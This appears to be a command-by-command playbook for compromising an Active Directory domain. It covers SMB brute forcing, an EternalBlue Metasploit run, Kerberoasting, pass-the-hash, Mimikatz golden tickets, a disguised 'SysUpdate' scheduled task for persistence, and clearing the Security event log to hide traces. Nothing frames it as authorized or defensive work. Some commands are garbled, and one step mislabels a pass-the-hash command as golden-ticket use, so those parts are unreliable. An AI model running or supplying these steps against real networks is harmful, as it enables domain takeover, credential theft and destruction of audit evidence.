Exploiting Active Directory typically involves multiple steps, including reconnaissance, gaining initial foothold, enumeration, and privilege escalation. Here's a step-by-step guide on exploiting Active Directory using commands and scripts:

### 1. Reconnaissance

**Identify the Target Network:**
  
nmap -p 445 --script smb-os-discovery,smb-enum-shares,smb-enum-users <TARGET_IP>
This Nmap command scans the target IP for SMB services, enumerates shares, and lists users.

### 2. Initial Foothold

**SMB Enumeration:**
  
enum4linux -a <TARGET_IP>
This tool provides detailed information about the SMB server, including shared resources and user accounts.

**Brute Force SMB Login:**
Use Hydra or Medusa to brute force SMB logins using a list of known usernames and passwords.
  
hydra -L users.txt -P passwords.txt smb://<TARGET_IP>

### 3. Exploiting Vulnerabilities

**EternalBlue Exploit:**
If the target is vulnerable to EternalBlue, you can use Metasploit to exploit it.
  
use exploit/windows/smb/ms17_010_eternalblue
set RHOST <TARGET_IP>
run

### 4. Post-Exploitation Enumeration

**Gather Information:**
After gaining access, enumerate the Active Directory environment to gather more information.

**PowerView for Enumeration:**
PowerView is a PowerShell tool to enumerate AD information.
  
Import-Module .\PowerView.ps1
Get-NetDomain
Get-NetForest
Get-NetForestDomain
Get-NetDomainController
Get-NetUser -AdminCount | Select cn

### 5. Privilege Escalation

**Kerberoasting:**
Extract service account credentials from Kerberos tickets.
  
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "HTTP/<TARGET_DOMAIN>"
Invoke-Kerberoast - Format ha cat

**Pass-the-Ha :**
Use credentials obtained through Kerberoasting to authenticate and move laterally.
  
pth-winexe -U <DOMAIN>/<USERNAME>%<NTLM_HASH> //<TARGET_IP> cmd

**Golden Ticket Attack:**
Create a Golden Ticket using Mimikatz.
  
mimikatz
kerberos::golden /user:<USERNAME> /domain:<DOMAIN> /sid:<DOMAIN_SID> /krbtgt:<KRBTGT_HASH> /id:500
kerberos::ptt <TICKET_PATH>

**Domain Admin Privileges:**
Use the Golden Ticket to authenticate as a Domain Admin.
  
mimikatz # sekurlsa::pth /user:<USERNAME> /domain:<DOMAIN> /ntlm:<NTLM_HASH>

### 6. Maintaining Access

**Persistence:**
Set up persistence mechanisms to maintain access to the domain.
  
schtasks /create /tn "SysUpdate" /tr "powershell.exe -File C:\path\to\script.ps1" /sc onlogon /ru "System"

### 7. Clean Up

**Remove Traces:**
Clean up any logs or files that could indicate your presence on the system.
  
Remove-Item -Path C:\path\to\script.ps1 -Force
Clear-EventLog -LogName Security

This guide covers the basic steps and commands needed to exploit Active Directory. For more advanced techniques, consider using tools like BloodHound for visualizing AD relationships and further exploiting potential attack paths.
